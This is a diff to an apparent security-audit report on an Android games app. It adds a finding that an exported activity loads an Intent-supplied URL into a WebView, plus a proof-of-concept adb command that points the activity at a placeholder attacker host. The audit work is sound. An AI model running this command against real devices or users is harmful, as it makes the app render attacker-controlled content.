@@ -8,7 +8,7 @@
 ## Summary
 
 - CRITICAL: 6
-- HIGH: 7
+- HIGH: 8
 - MEDIUM: 24
 - LOW: 12
 - INFO: 4
@@ -148,6 +148,15 @@ WebView.setWebContentsDebuggingEnabled(true) is a static, process-wide switch. A
 invoke-static {p1}, Lkotlin/ResultKt;->b(Ljava/lang/Object;)V
 
     invoke-static {v0}, Landroid/webkit/WebView;->setWebContentsDebuggingEnabled(Z)V
+```
+
+### [HIGH] CORR-023 - com.nytimes.games.features.hybrid.components.base.HybridComponentActivity: exported entry point loads an Intent-supplied URL into a WebView
+_com.nytimes.games.features.hybrid.components.base.HybridComponentActivity_
+
+This exported activity derives the URL it displays from the Intent that started it (extra, data, or an extra's URL field) and passes it straight to WebView.loadUrl. Any app on the device can start it with an explicit intent and an arbitrary URL — no intent-filter is required, and no in-app user action is involved — so attacker-controlled web content renders inside the app's own WebView.
+
+```
+exported=true; intent extras -> getString(url) -> loadUrl
 ```
 
 ### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
@@ -568,6 +577,20 @@ addJavascriptInterface exposes a native object to page script. A bridge reachabl
 addJavascriptInterface(this, "NYTG")  methods=['enqueue']
 ```
 
+## Reachability
+
+These exported entry points render a URL chosen by whoever launches them, so any app on the device (or an ad SDK, or a browsed link) can drive them with no user action inside the app. Verify on a test device with `adb`, substituting the component and extra key:
+
+```sh
+# com.nytimes.games.features.hybrid.components.base.HybridComponentActivity
+adb shell am start -n com.nytimes.crossword/com.nytimes.games.features.hybrid.components.base.HybridComponentActivity -e url "https://attacker.example/poc.html"
+
+```
+
+| component | intent-URL flow | JS bridge | local file access |
+|-----------|-----------------|-----------|-------------------|
+| `com.nytimes.games.features.hybrid.components.base.HybridComponentActivity` | intent extras -> getString(url) -> loadUrl | — | — |
+
 ## WebView hosts
 
 ### `com.nytimes.games.features.hybrid.components.vanilla.VanillaGameComponentActivityKt`
@@ -589,6 +612,7 @@ addJavascriptInterface(this, "NYTG")  methods=['enqueue']
   - `javascript_enabled` = `False`
   - `js_can_open_windows_automatically` = `False`
   - `support_multiple_windows` = `False`
+- intent-supplied URL: `intent extras -> getString(url) -> loadUrl`
 
 ### `com.nytimes.games.integrations.hybrid.HybridWebViewConfigurer`
 - sources: smali
@@ -700,6 +724,7 @@ addJavascriptInterface(this, "NYTG")  methods=['enqueue']
 - settings:
   - `dom_storage_enabled` = `True`
   - `javascript_enabled` = `True`
+- intent-supplied URL: `intent.getStringExtra(...) -> stringExtra -> loadUrl(stringExtra)`
 
 ### `co.datadome.sdk.DataDomeWebView`
 - sources: smali
